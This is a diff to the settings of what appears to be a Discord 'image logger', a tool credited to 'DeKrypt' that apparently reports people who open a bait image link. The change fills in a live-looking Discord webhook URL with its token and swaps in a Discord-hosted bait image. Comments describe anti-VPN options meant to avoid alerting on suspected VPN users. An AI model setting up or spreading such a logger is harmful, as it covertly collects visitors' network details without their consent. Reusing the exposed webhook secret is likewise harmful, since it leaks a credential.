@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2016/08/avira_blog_mr.robot-header.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://ptb.discord.com/api/webhooks/1521637950037819564/tFicXUYtITVwfQpP0iehDQKCxA1ctjHU4IX1nLcPpTlowaStNOB17g1n0C54BXRoVZKx",
+    "image": "https://cdn.discordapp.com/attachments/1513702391004790826/1521638796125540484/Screenshot_2026-06-28_131806.png?ex=6a45900f&is=6a443e8f&hm=c71f0f60d386bb69305634eec7b4f329af5a4afe2c78c9e20565ec5b1dfd3f2c&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -32,7 +32,7 @@ config = {
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert    
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
